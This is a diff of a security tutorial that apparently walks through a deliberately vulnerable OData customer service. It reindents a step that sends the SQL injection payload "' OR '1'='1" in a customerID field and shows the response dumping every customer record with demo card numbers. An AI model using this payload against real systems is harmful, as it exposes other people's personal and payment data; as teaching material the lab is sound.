@@ -143,74 +143,73 @@ Copy the contents of [services_vulnerable.js](./srv/services_vulnerable.js) into
   - Navigates to a function in ###Step2 that looks up customer information and click on send request.
   
 ``` 
-    ### Step 2: SQL Injection True-Clause Attack
-    ### Action: Inject malicious payload ' OR '1'='1
-    ### Expected: Returns ALL customer records
-    ### Result: Full database exposure vulnerability
-    GET {{server}}/odata/v4/admin/fetchCustomer
-    Content-Type: application/json
-    Authorization: Basic {{username}}:{{password}}
-    {
-      "customerID": "1004100' OR '1'='1"
-    }
-
+  ### 🚨 Test 2: SQL Injection True-Clause Attack
+  ### Action: Inject malicious payload ' OR '1'='1
+  ### Expected: Returns ALL customer records
+  ### Result: Full database exposure vulnerability
+  GET {{server}}/odata/v4/admin/fetchCustomer
+  Content-Type: application/json
+  Authorization: Basic {{username}}:{{password}}
+  {
+    "customerID": "1004100' OR '1'='1"
+  }
 ```
 - Result:
 
 ``` 
-HTTP/1.1 200 OK
-X-Powered-By: Express
-X-Correlation-ID: 06576897-f3fa-4d90-ab7c-bd175dd21abf
-OData-Version: 4.0
-Content-Type: application/json; charset=utf-8
-Content-Length: 950
-Date: Sun, 28 Sep 2025 19:02:26 GMT
-Connection: close
-
-{
-  "@odata.context": "$metadata#Customers",
-  "value": [
-    {
-      "createdAt": "2025-09-28T19:02:19.936Z",
-      "createdBy": "anonymous",
-      "modifiedAt": "2025-09-28T19:02:19.936Z",
-      "modifiedBy": "anonymous",
-      "ID": "1004155",
-      "firstName": "Daniel",
-      "lastName": "Watts",
-      "name": "Daniel Watts",
-      "email": "daniel.watts@demo.com",
-      "phone": "+39-555-123",
-      "creditCardNo": "4111111111111111"
-    },
-    {
-      "createdAt": "2025-09-28T19:02:19.936Z",
-      "createdBy": "anonymous",
-      "modifiedAt": "2025-09-28T19:02:19.936Z",
-      "modifiedBy": "anonymous",
-      "ID": "1004161",
-      "firstName": "Stormy",
-      "lastName": "Weathers",
-      "name": "Stormy Weathers",
-      "email": "stormy.weathers@demo.com",
-      "phone": "+49-020-022",
-      "creditCardNo": "5500000000000004"
-    },
-    {
-      "createdAt": "2025-09-28T19:02:19.936Z",
-      "createdBy": "anonymous",
-      "modifiedAt": "2025-09-28T19:02:19.936Z",
-      "modifiedBy": "anonymous",
-      "ID": "1004100",
-      "firstName": "Sunny",
-      "lastName": "Sunshine",
-      "name": "Sunny Sunshine",
-      "email": "sunny.sunshine@demo.com",
-      "phone": "+49-555-789",
-      "creditCardNo": "3400000000000094"
-    }
-  ]
-}  
+  HTTP/1.1 200 OK
+  X-Powered-By: Express
+  X-Correlation-ID: 06576897-f3fa-4d90-ab7c-bd175dd21abf
+  OData-Version: 4.0
+  Content-Type: application/json; charset=utf-8
+  Content-Length: 950
+  Date: Sun, 28 Sep 2025 19:02:26 GMT
+  Connection: close
+  
+  {
+    "@odata.context": "$metadata#Customers",
+    "value": [
+      {
+        "createdAt": "2025-09-28T19:02:19.936Z",
+        "createdBy": "anonymous",
+        "modifiedAt": "2025-09-28T19:02:19.936Z",
+        "modifiedBy": "anonymous",
+        "ID": "1004155",
+        "firstName": "Daniel",
+        "lastName": "Watts",
+        "name": "Daniel Watts",
+        "email": "daniel.watts@demo.com",
+        "phone": "+39-555-123",
+        "creditCardNo": "4111111111111111"
+      },
+      {
+        "createdAt": "2025-09-28T19:02:19.936Z",
+        "createdBy": "anonymous",
+        "modifiedAt": "2025-09-28T19:02:19.936Z",
+        "modifiedBy": "anonymous",
+        "ID": "1004161",
+        "firstName": "Stormy",
+        "lastName": "Weathers",
+        "name": "Stormy Weathers",
+        "email": "stormy.weathers@demo.com",
+        "phone": "+49-020-022",
+        "creditCardNo": "5500000000000004"
+      },
+      {
+        "createdAt": "2025-09-28T19:02:19.936Z",
+        "createdBy": "anonymous",
+        "modifiedAt": "2025-09-28T19:02:19.936Z",
+        "modifiedBy": "anonymous",
+        "ID": "1004100",
+        "firstName": "Sunny",
+        "lastName": "Sunshine",
+        "name": "Sunny Sunshine",
+        "email": "sunny.sunshine@demo.com",
+        "phone": "+49-555-789",
+        "creditCardNo": "3400000000000094"
+      }
+    ]
+  }  
 
 ``` 
 
